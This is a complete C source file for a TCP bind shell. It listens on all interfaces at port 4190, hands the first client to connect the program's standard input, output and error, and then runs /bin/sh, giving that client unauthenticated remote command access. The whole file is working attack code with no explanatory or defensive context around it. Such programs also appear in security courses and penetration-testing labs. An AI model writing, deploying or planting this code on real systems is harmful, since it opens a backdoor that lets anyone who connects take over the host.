/*
  C program that binds a command shell to a listening port, also known as a bind shell. (in TCP!)
*/

#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <netinet/in.h>
#include <unistd.h>

#define ADDRESS "0.0.0.0"
#define PORT 4190

int main()
{
  // Initialize the socket object.
  int shellSock = socket(AF_INET, SOCK_STREAM, 0);
  if (shellSock < 0)
  {
    perror("[x] Failed To Create Socket! [x]");
    exit(1);
  }
  printf("Socket FD: %d\n", shellSock);

  // Define the Address structure.
  struct sockaddr_in server_addr;
  memset(&server_addr, 0, sizeof(server_addr));
  socklen_t addrlen = sizeof(server_addr);

  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(PORT);
  server_addr.sin_addr.s_addr = INADDR_ANY;

  // Bind the socket to the server address.
  if (bind(shellSock, (struct sockaddr *)&server_addr, addrlen) < 0)
  {
    perror("[x] Failed To Bind Socket! [x]");
    exit(1);
  }

  printf("[+] Socket Bound To Address! [+]\n");

  // Listen for incoming client connection.
  if (listen(shellSock, 1) < 0)
  {
    perror("[x] Failed To Listen On Socket! [x]");
    exit(1);
  }
  printf("[+] Listening On Port %d [...]\n", PORT);

  // Accept incoming client connection.
  int clientSock = accept(shellSock, (struct sockaddr *)&server_addr, &addrlen);
  if (clientSock < 0)
  {
    perror("[x] Failed To Accept Client On Socket! [x]");
    exit(1);
  }
  printf("[+] Client Online! [+]\n");

  for (int i = 0; i < 3; i++)
  {
    dup2(clientSock, i);
  }

  // Execute /bin/sh so the client can have a shell.
  char * const argv[] = {"/bin/sh", NULL};
  execvp("/bin/sh", argv);
    
  close(shellSock);
  return EXIT_SUCCESS;
}
